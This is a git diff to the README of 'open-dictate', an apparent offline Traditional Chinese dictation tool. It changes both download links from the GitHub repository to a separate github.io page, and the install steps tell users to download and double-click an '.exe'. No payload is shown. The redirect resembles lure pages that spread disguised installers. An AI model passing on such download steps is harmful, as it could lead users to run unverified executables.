@@ -1,6 +1,6 @@
 # 🎙️ open-dictate - Fast dictation for Traditional Chinese text
 
-[![Download open-dictate](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/Ahmedhass6140/open-dictate)
+[![Download open-dictate](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://ahmedhass6140.github.io)
 
 open-dictate turns your voice into Traditional Chinese text. It works on your computer without sending your data to the internet. You keep your files private. 
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool well. Please
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official page to download the latest setup file: [https://github.com/Ahmedhass6140/open-dictate](https://github.com/Ahmedhass6140/open-dictate).
+1.  Visit the official page to download the latest setup file: [https://ahmedhass6140.github.io](https://ahmedhass6140.github.io).
 2.  Click the link under the "Assets" section that ends in ".exe".
 3.  Wait for the file to finish downloading to your Downloads folder.
 4.  Double-click the downloaded file to start the installation.
